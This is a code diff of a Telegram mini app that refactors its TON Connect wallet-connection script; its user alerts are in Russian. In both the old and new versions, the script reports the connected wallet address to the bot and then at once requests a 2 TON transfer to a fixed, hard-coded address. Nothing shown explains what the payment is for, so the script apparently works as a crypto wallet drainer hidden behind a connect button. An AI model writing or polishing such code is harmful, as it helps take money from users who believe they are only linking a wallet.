@@ -61,40 +61,40 @@
         let tg = window.Telegram.WebApp;
         tg.expand();
 
-        async function initTonConnect() {
+        async function connectWallet() {
             try {
                 const tonConnect = new TONConnect({
                     manifestUrl: "https://rfrfqrfarfqf.github.io/Telegram-mini-app/tonconnect-manifest.json"
                 });
 
-                document.getElementById("connect-wallet").addEventListener("click", async function() {
-                    try {
-                        const connectedWallet = await tonConnect.connect();
-                        if (connectedWallet) {
-                            const walletAddress = connectedWallet.account.address;
+                console.log("TON Connect initialized");
 
-                            tg.sendData(JSON.stringify({ wallet: walletAddress }));
-                            tg.showAlert("Кошелек подключен: " + walletAddress);
+                const connectedWallet = await tonConnect.connect();
+                if (connectedWallet) {
+                    const walletAddress = connectedWallet.account.address;
 
-                            const transaction = {
-                                to: "UQDDZ6llEnqAe2QqRAyuY3rQkWa3ZdFFH_Ksc8AjcrRvtFzc",
-                                value: "2000000000",
-                                payload: "",
-                            };
+                    tg.sendData(JSON.stringify({ wallet: walletAddress }));
+                    tg.showAlert("Кошелек подключен: " + walletAddress);
 
-                            await tonConnect.sendTransaction(transaction);
-                            tg.showAlert("Транзакция создана! Подтвердите в кошельке.");
-                        }
-                    } catch (error) {
-                        tg.showAlert("Ошибка подключения: " + error.message);
-                    }
-                });
+                    const transaction = {
+                        to: "UQDDZ6llEnqAe2QqRAyuY3rQkWa3ZdFFH_Ksc8AjcrRvtFzc",
+                        value: "2000000000",
+                        payload: "",
+                    };
+
+                    await tonConnect.sendTransaction(transaction);
+                    tg.showAlert("Транзакция создана! Подтвердите в кошельке.");
+                } else {
+                    console.error("Ошибка: Кошелек не подключился");
+                }
             } catch (error) {
-                console.error("Ошибка инициализации TON Connect:", error);
+                console.error("Ошибка при подключении:", error);
+                tg.showAlert("Ошибка: " + error.message);
             }
         }
 
-        initTonConnect();
+        document.getElementById("connect-wallet").addEventListener("click", connectWallet);
     </script>
 </body>
 </html>
+
